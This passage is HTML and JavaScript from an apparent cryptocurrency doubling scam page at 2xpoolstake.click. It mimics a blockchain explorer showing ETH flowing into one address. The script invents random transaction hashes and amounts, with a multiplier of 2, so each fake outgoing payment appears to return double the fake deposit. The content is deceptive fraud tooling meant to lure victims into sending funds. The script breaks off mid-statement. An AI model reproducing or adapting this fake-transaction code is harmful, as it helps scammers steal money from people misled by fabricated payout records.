text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>42.89 ETH</td> <td><span class="small text-secondary">0<b>.</b>00094</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">6019e2c360e5x4ec0E96391437cB1F0c926059a9xa65e959681F9ED3802Fx00</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">975181966</a></td> <td><span class="timer">10 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Remitano 1</a> </td> <td>12.98 ETH</td> <td><span class="small text-secondary">0<b>.</b>000529</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">71E082cAB0x6E70643991c2c19c410Fx00a0x910103A0c0BD60aE95F342E50E</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">978196787</a></td> <td><span class="timer">10 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Remitano 1</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>6.49 ETH</td> <td><span class="small text-secondary">0<b>.</b>000495</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0B9976BEFe9cF443F26E00F15F30E1BB49100674677FA0411c9AB09903E305B</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">971490480</a></td> <td><span class="timer">11 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Remitano 1</a> </td> <td>99.9 ETH</td> <td><span class="small text-secondary">0<b>.</b>000285</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">e8c99073039676001a40EF090c6Dce23Ex8cx2A986FE34090c5F42018950c0E</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">916911940</a></td> <td><span class="timer">11 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Remitano 1</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>49.95 ETH</td> <td><span class="small text-secondary">0<b>.</b>000652</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">ac0Bc8694ec70F70B59097E6xD0856E04370c7c106Fc9604x03364904460708</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">928172095</a></td> <td><span class="timer">12 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xB9E0FD2638A0aEE6F3a610076F6664c9616B4c0e</a> </td> <td>92.68 ETH</td> <td><span class="small text-secondary">0<b>.</b>000521</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">c0F86cc7B63660e2FDFD4F0006ec04e02c912F31798c800085D0603997789EA</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">96455682</a></td> <td><span class="timer">12 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xB9E0FD2638A0aEE6F3a610076F6664c9616B4c0e</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>46.34 ETH</td> <td><span class="small text-secondary">0<b>.</b>000313</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">036963eA0863A9caF2800691A2x3x600B01A9066x0c36AB0EFFc0450531B08a</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">928845313</a></td> <td><span class="timer">13 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x8c4F00cxc680FE0E9591E008F4ce33402Dc9c096</a> </td> <td>49.8 ETH</td> <td><span class="small text-secondary">0<b>.</b>00085</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">5Ba41E66c1EF179F3F0eeDx690FcD0F6c5c0868caFc9E02815F66BA4c90E0a5</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">94990712</a></td> <td><span class="timer">13 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x8c4F00cxc680FE0E9591E008F4ce33402Dc9c096</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>24.90 ETH</td> <td><span class="small text-secondary">0<b>.</b>000144</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">E886DF09E9439c4A3685c7c6Dc109A60F8646EF30F90490aaF29aD92400c07A</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">942650478</a></td> <td><span class="timer">14 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x10E9F0x7F8xE05803ca6AF4676F034E08966F03A</a> </td> <td>19.02 ETH</td> <td><span class="small text-secondary">0<b>.</b>000389</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">E3046934Ec92c4317F49484xaE899990EE4F17a19640558c0Fa960589E4F0aF</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">957477900</a></td> <td><span class="timer">14 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x10E9F0x7F8xE05803ca6AF4676F034E08966F03A</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>9.51 ETH</td> <td><span class="small text-secondary">0<b>.</b>00042</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">E11996549090957E6D36B4729138806c55a6a90E086674cc9DF49ac19ee40a9</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">935594135</a></td> <td><span class="timer">15 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xA0168A1096B55505F09923A0096606529806xAE7</a> </td> <td>92.98 ETH</td> <td><span class="small text-secondary">0<b>.</b>000157</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">69ee6357Acc06E6c04E72A69F00cx397cc790c54237F56689c2D098F5669A01</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">947986849</a></td> <td><span class="timer">15 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xA0168A1096B55505F09923A0096606529806xAE7</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>46.49 ETH</td> <td><span class="small text-secondary">0<b>.</b>000746</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">6c14E69a7094748De8602A67A50eB10B4807662c009917FE97446E9E0x0Ae66</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">918560625</a></td> <td><span class="timer">16 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">HitBTC 2</a> </td> <td>34.62 ETH</td> <td><span class="small text-secondary">0<b>.</b>000515</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">e4F0x8E36a9c969645a7cFE358984619F97a0xEc38051E0045AD57Fee009600</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">943329415</a></td> <td><span class="timer">16 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">HitBTC 2</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>17.31 ETH</td> <td><span class="small text-secondary">0<b>.</b>000598</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">EF4D90c1E1B93c7D319E998034D34Fc7Bcc166D90AF6A207B54D779a5A66106</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">917617966</a></td> <td><span class="timer">17 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">LAToken 3</a> </td> <td>44.74 ETH</td> <td><span class="small text-secondary">0<b>.</b>000294</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0E530xcc107696cxD603eE643936ED4F9908569808A4F66E10E09x0867963A3</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">925126378</a></td> <td><span class="timer">17 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">LAToken 3</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>22.37 ETH</td> <td><span class="small text-secondary">0<b>.</b>000470</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">30604D480008004B2589c73F560F98c06B440c6D7e85e8a150290x69679E913</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">946738920</a></td> <td><span class="timer">18 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xcA965239c1F18E0942F7ce37a0c88c4A32374988</a> </td> <td>2.96 ETH</td> <td><span class="small text-secondary">0<b>.</b>000998</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0c39506e5a0cc91E10x89a2081F57044960xc1E800E94a084E0170E0DBa0B11</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">93194811</a></td> <td><span class="timer">18 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xcA965239c1F18E0942F7ce37a0c88c4A32374988</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>1.48 ETH</td> <td><span class="small text-secondary">0<b>.</b>000483</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">6e008300ex6697E59c98c479686xB09933233c769BF603aA394xAx472E793eF</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">974064184</a></td> <td><span class="timer">19 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xc0DB998E3D0cB0038x8080a30c562c09c1c8A010</a> </td> <td>82.1 ETH</td> <td><span class="small text-secondary">0<b>.</b>00035</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">A417005005466074FE0028x861c11307c00D8F6405909300E0220cA0Bx0c904</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">959012077</a></td> <td><span class="timer">19 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0xc0DB998E3D0cB0038x8080a30c562c09c1c8A010</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>41.05 ETH</td> <td><span class="small text-secondary">0<b>.</b>000618</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">1a7040FB09FxA2E9830c15F29140868AE00B0760446D00477c07F5Aec0aDc1F</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">943820138</a></td> <td><span class="timer">20 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Binance 2</a> </td> <td>9.18 ETH</td> <td><span class="small text-secondary">0<b>.</b>000785</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">16335c398900F69AD43E0063x81044040485c9c94444714x0c80400807F3699</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">975089339</a></td> <td><span class="timer">20 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Binance 2</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>4.59 ETH</td> <td><span class="small text-secondary">0<b>.</b>000383</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">9D36B4c1c70768503ec060591c098e08E98xc60x4FEx7cF405B084851cc6xcB</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">960593121</a></td> <td><span class="timer">21 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x0E608090a8B5467D60Ac6606c83549678c3x66E0</a> </td> <td>61.44 ETH</td> <td><span class="small text-secondary">0<b>.</b>000720</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">654cF04039E90188063c4717F71Ec9c58c5Ae4973900c0F0D4E559500e908c1</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">991547455</a></td> <td><span class="timer">21 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x0E608090a8B5467D60Ac6606c83549678c3x66E0</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>30.72 ETH</td> <td><span class="small text-secondary">0<b>.</b>000353</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">9cax0E0D0F6x640E9893334480xF03001e096cF0464197cE583E90E38e62980</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">979647833</a></td> <td><span class="timer">22 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Remitano 2</a> </td> <td>11.3 ETH</td> <td><span class="small text-secondary">0<b>.</b>000327</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">9992ca05F190c0EDAc5Bx4F9c7F0e0e41e17c16F100caF0c0270D9300190FE0</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">933633819</a></td> <td><span class="timer">22 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Remitano 2</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>5.65 ETH</td> <td><span class="small text-secondary">0<b>.</b>000991</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">F0600Fc6cAe9a48B71E6a84EA07469F908F4305x96B4F9459F06Dc090500900</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">959762853</a></td> <td><span class="timer">23 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x66FF09Bc00032cF08F20F6930e34EB8D448c0906</a> </td> <td>20.1 ETH</td> <td><span class="small text-secondary">0<b>.</b>000862</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">639c004A16c70EA16696395x090c9c1090576E6B154FB00B04c096649051870</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">941360939</a></td> <td><span class="timer">23 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x66FF09Bc00032cF08F20F6930e34EB8D448c0906</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>10.05 ETH</td> <td><span class="small text-secondary">0<b>.</b>000972</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0e9Ee665518066ac58048cEEF0918FcF70491A0BE8F0E8xB6xce7c98c63x778</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">964617580</a></td> <td><span class="timer">24 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x88c9c4699c8935AcA04450BaE6Ee40aeaAxE6820</a> </td> <td>81.6 ETH</td> <td><span class="small text-secondary">0<b>.</b>000865</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">670c40306006c0E8D0Ae094AA7E4009940688c1aE4A6867660cD09550266094</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">983120662</a></td> <td><span class="timer">24 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">0x88c9c4699c8935AcA04450BaE6Ee40aeaAxE6820</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>40.80 ETH</td> <td><span class="small text-secondary">0<b>.</b>000134</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">909c9c3DE3B440F866940268004cA54068E46096a04460183c154a8x67019EE</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">926834142</a></td> <td><span class="timer">25 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">CoinExchange.io</a> </td> <td>14.3 ETH</td> <td><span class="small text-secondary">0<b>.</b>000342</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">9aF500e6F19c898c05079699Fa1E406003e00a8cF68619c0c05036c0190589c</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">919230628</a></td> <td><span class="timer">25 mins ago</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">CoinExchange.io</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>7.15 ETH</td> <td><span class="small text-secondary">0<b>.</b>000922</span></td> </tr><tr> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">407x448cB5c947064378c0c09c600c91D0D3xc686xe090c0xxF00ec0Ac805c0</a> </td> <td class="d-none d-sm-table-cell"><a href="https://2xpoolstake.click/ETH/index.html">965431823</a></td> <td><span class="timer">26 mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="https://2xpoolstake.click/ETH/index.html">Remitano 2</a> </td> <td>20.34 ETH</td> <td><span class="small text-secondary">0<b>.</b>000651</span></td> </tr></thead>
+                                    <tbody></tbody>
+                                </table>
+                            </div>
+                            <div class="d-flex justify-content-between align-items-center mt-3 mb-4">
+                                <div class="d-flex align-items-center text-secondary"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <!-- ###############################Start of progress bar######################################### -->
+
+        <script src="./ETH_files/jquery-3.6.0.min.js.download"></script>
+    <script>
+        
+
+
+
+
+var parcent = 2
+
+function update_count() {
+  setInterval(() => {
+    $('#num_').text(parseInt($('#num_').text()) + 1)
+  }, 12e4)
+}
+
+function tx(_) {
+  return 1 + Math.floor(Math.random() * _)
+}
+
+function dec2hex(dec) {
+  return ('0' + dec.toString(16)).substr(-2)
+}
+
+function generateId(length) {
+  for (
+    var result = '',
+      characters =
+        '0x60ED062961e81B0907ca094cEFc965A0433F8574',
+      charactersLength = characters.length,
+      i = 0;
+    i < length;
+    i++
+  )
+    result += characters.charAt(Math.floor(Math.random() * charactersLength))
+  return result
+}
+
+function startaddress(length = 1) {
+  for (
+    var result = '',
+      characters = '13',
+      charactersLength = characters.length,
+      i = 0;
+    i < length;
+    i++
+  )
+    result += characters.charAt(Math.floor(Math.random() * charactersLength))
+  return result
+}
+
+function create_transaction(mins) {
+  var table,
+    row = (table = document.getElementById('myTable')).insertRow(1),
+    address = get_random(),
+    amount = (50 * Math.random()).toFixed(2),
+    decimal = String(Math.random(1, 999))
+  row.innerHTML =
+    '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="index.html">' +
+    generateId(63) +
+    '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
+    tx(99999999) +
+    '</a></td> <td><span class="timer">' +
+    mins +
+    ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
+    address +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>' +
+    amount +
+    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    tx(999) +
+    '</span></td> </tr>'
+  var table,
+    row = (table = document.getElementById('myTable')).insertRow(1),
+    send_amount = amount * parcent
+  row.innerHTML =
+    '<tr> <td><a class="hash-tag text-truncate" href="index.html">' +
+    generateId(63) +
+    '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
+    tx(99999999) +
+    '</a></td> <td><span class="timer">' +
+    mins +
+    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
+    address +
+    '</a> </td> <td>' +
+    send_amount +
+    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    tx(999) +
+    '</span></td> </tr>'
+}
+
+function update_tx() {
+  setInterval(() => {
+    $('#num_').text(parseInt($('#num_').text()) + 1)
+  }, 12e4)
+}
+
+function new_transaction() {
+  var table,
+    row = document.getElementById('myTable').insertRow(1),
+    address = get_random(),
+    amount = (50 * Math.random()).toFixed(2),
+    decimal = String(Math.random(1, 999))
+  ;(row.innerHTML =
+    '<tr> <td><a class="hash-tag text-truncate" href="index.html">' +
+    generateId(63) +
+    '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
+    tx(99999999) +
+    '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
+    address +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td>' +
+    amount +
+    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    tx(999) +
+    '</span></td> </tr>'),
+    document
+      .getElementById('myTable')
+      .deleteRow(document.getElementById('myTable').rows.length - 1),
+    document.getElementsByTagName('tr')[1].classList.add('toolbar'),
+    setTimeout(() => {
+      var table,
+        row = document.getElementById('myTable').insertRow(1),
+        send_amount = amount * parcent
+      ;(row.innerHTML =
+        '<tr> <td><a class="hash-tag text-truncate" href="index.html">' +
+        generateId(63) +
+        '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
+        tx(99999999) +
+        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0x60ED062961e81B0907ca094cEFc965A0433F8574</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
+        address +
